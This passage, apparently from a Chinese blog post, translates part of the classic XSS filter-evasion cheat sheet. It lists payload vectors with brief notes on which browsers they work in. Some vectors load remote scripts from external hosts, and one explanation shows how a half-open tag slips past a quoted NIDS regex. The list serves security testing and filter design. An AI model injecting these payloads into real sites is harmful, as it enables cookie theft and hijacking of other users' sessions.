<h4 id="没关闭的script标签"><a href="#没关闭的script标签" class="headerlink" title="没关闭的script标签"></a>没关闭的script标签</h4><p>对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;“这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js?&lt; B &gt;</div></pre></td></tr></table></figure></p>
<h4 id="script标签中的协议解析"><a href="#script标签中的协议解析" class="headerlink" title="script标签中的协议解析"></a>script标签中的协议解析</h4><p>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</div></pre></td></tr></table></figure></p>
<h4 id="半开的HTML-JavaScript-xss向量"><a href="#半开的HTML-JavaScript-xss向量" class="headerlink" title="半开的HTML/JavaScript xss向量"></a>半开的HTML/JavaScript xss向量</h4><p>不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指定在图片标签中这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以插入这个xss向量在任何html标签后面。甚至没有用”&gt;”关闭标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 这也是有效的去对付真实的xss过滤器，我曾经碰见过试用半开的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</div></pre></td></tr></table></figure></p>
<h4 id="双开尖括号"><a href="#双开尖括号" class="headerlink" title="双开尖括号"></a>双开尖括号</h4><p>使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=http://damit5.ml/xss.html &lt;</div></pre></td></tr></table></figure></p>
<h4 id="转义javascript中的转义"><a href="#转义javascript中的转义" class="headerlink" title="转义javascript中的转义"></a>转义javascript中的转义</h4><p>当一个应用程序是输出用户自定义的信息到javascript代码中，例如：<br><code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code><br>如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过转义被转义的字符来绕过它。从而使最终的输入代码类似于<code>&lt;SCRIPT&gt;var a=&quot;\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code> 。最终\转义了双引号前被服务器添加的\，而双引号则不会被转义，从而触发xss向量。xss定位器使用这个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\&quot;;alert(&apos;XSS&apos;);//</div></pre></td></tr></table></figure></p>
<h4 id="闭合title标签"><a href="#闭合title标签" class="headerlink" title="闭合title标签"></a>闭合title标签</h4><p>这是一个简单的xss向量，可以引入一个恶意的xss攻击。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p>
<h4 id="INPUT-image"><a href="#INPUT-image" class="headerlink" title="INPUT image"></a>INPUT image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="BODY-image"><a href="#BODY-image" class="headerlink" title="BODY image"></a>BODY image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="IMG-DYNSRC-视频剪辑"><a href="#IMG-DYNSRC-视频剪辑" class="headerlink" title="IMG DYNSRC(视频剪辑)"></a>IMG DYNSRC(视频剪辑)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="IMG-lowsrc（低分辨率图片）"><a href="#IMG-lowsrc（低分辨率图片）" class="headerlink" title="IMG lowsrc（低分辨率图片）"></a>IMG lowsrc（低分辨率图片）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="List-style-image"><a href="#List-style-image" class="headerlink" title="List-style-image"></a>List-style-image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure>
<h4 id="List-style-image-1"><a href="#List-style-image-1" class="headerlink" title="List-style-image"></a>List-style-image</h4><p>为带有符号的列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为javascript指令。这不是一个特别有用的xss向量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure></p>
<h4 id="VBscript-in-an-image"><a href="#VBscript-in-an-image" class="headerlink" title="VBscript in an image"></a>VBscript in an image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</div></pre></td></tr></table></figure>
<h4 id="Livescript-仅适用于老版本的Netscape"><a href="#Livescript-仅适用于老版本的Netscape" class="headerlink" title="Livescript (仅适用于老版本的Netscape)"></a>Livescript (仅适用于老版本的Netscape)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="BGSOUND-背景音乐"><a href="#BGSOUND-背景音乐" class="headerlink" title="BGSOUND(背景音乐)"></a>BGSOUND(背景音乐)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="amp-JavaScript-包含"><a href="#amp-JavaScript-包含" class="headerlink" title="&amp; JavaScript 包含"></a>&amp; JavaScript 包含</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="样式表"><a href="#样式表" class="headerlink" title="样式表"></a>样式表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<div id="aplayer9" class="aplayer" style="margin-bottom: 20px;"></div>
		<script>
			new APlayer({
				element: document.getElementById("aplayer9"),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: "六月的雨",
					author: "胡歌",
					url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
					pic: "http://damit5.kiwi/Music/233.jpg",
				}
			});
		</script>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

